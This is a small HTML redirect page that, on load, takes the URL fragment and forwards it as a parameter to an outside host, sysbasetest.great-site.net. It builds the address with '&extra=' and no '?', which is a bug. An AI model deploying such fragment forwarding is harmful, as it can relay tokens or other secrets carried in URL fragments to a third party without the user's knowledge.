<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    window.onload = function() {
      const hash = window.location.hash.substring(1); // Get the value after #
      const baseURL = 'https://sysbasetest.great-site.net';
      
      if (hash) {
        window.location.href = baseURL + '&extra=' + hash; // Append hash as extra param
      } else {
        window.location.href = baseURL;
      }
    };
  </script>
</head>
<body>
  Redirecting...
</body>
</html>
